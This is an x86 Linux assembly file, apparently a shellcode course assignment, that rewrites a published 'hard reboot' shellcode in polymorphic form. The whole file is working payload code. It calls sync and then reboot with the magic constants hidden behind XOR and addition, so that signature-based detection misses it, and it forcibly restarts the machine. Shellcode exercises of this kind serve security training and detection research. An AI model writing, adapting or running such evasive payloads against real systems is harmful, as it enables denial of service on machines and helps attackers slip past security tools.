; Polymorphic version of gunslinger's hard reboot shellcode
; Original author: gunslinger_ <yudha.gunslinger[at]gmail.com>
; http://shell-storm.org/shellcode/files/shellcode-639.php
; Original size: 33 bytes
; Polymorphic size: 45 bytes
; SLAE-860
; Assignment 6


global _start

section .text

    _start:
        mov al, 0x24
        int 0x80
        xor eax, eax
        mov al, 0x58
        mov ebx, 0xdeadbeef
        xor ebx, 0x204C6042
        mov ecx, 0x14256783
        add ecx, 0x13ECB1E6
        mov edx, 0x1234567
        int 0x80
        xor eax, eax
        mov al, 0x1
        xor ebx, ebx
        int 0x80


